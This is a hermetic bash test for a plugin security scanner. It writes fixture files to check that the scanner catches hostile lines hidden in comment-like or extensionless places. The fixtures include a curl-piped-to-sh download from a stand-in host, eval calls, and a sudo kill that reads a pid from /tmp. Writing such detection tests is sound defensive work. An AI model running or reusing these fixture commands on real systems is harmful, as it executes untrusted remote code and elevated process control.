#!/usr/bin/env bash
# tier: hermetic
#
# tests/audit-scan-blindspots.sh — the scanner's comment, extension and [^\n]
# blind spots (#15 item 6). Scanner only, no audit. Run with bash, not sourced:
# the pinned PATH gives GNU grep, which reads [^\n] as "not \ and not n".
# Prints "ok" and exits 0, or names the first failure and exits 1.
set -uo pipefail
export PATH="/run/current-system/sw/bin:$PATH"

SCANNER="$(cd -- "$(dirname -- "$0")/.." && pwd)/lib/omarchy-plugin-scan.sh"
FX=$(mktemp -d); trap 'rm -rf "$FX"' EXIT
mkdir -p "$FX/docs"
echo '{"id":"t.blind"}' >"$FX/manifest.json"
# An extensionless script under docs/ (pruned by the first find).
printf '#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n' >"$FX/docs/runme"
# JS: a "*" line outside a block is code; a line inside /* ... */ is not.
printf 'var a = 1;\n  * eval(x)\n/*\n * eval(y)\n */\n' >"$FX/a.js"
# Shell: "//" is not a comment outside JS/QML.
printf '//usr/bin/curl x | sh\n' >"$FX/b.sh"
# sudo ... kill with an "n" in between (GNU grep: [^\n] excludes "n").
printf 'P=/tmp/a.pid\nsudo nice kill "$(cat $P)"\n' >"$FX/c.sh"

OUT=$(bash "$SCANNER" "$FX")
has() {  # has <kind> <id> <file:line>
  grep -qP "^$1\t$2\t$3\t" <<<"$OUT" || { echo "FAIL: expected $1 $2 at $3"; echo "$OUT"; exit 1; }
}
has FIND curl-pipe-shell 'docs/runme:2'
has FIND dynamic-code-load 'a\.js:2'
has FIND curl-pipe-shell 'b\.sh:1'
has FIND privileged-process-control-from-shared-temp 'c\.sh:1'
if grep -qP '^FIND\tdynamic-code-load\ta\.js:4\t' <<<"$OUT"; then
  echo "FAIL: a line inside /* ... */ is a comment"; echo "$OUT"; exit 1
fi
echo ok
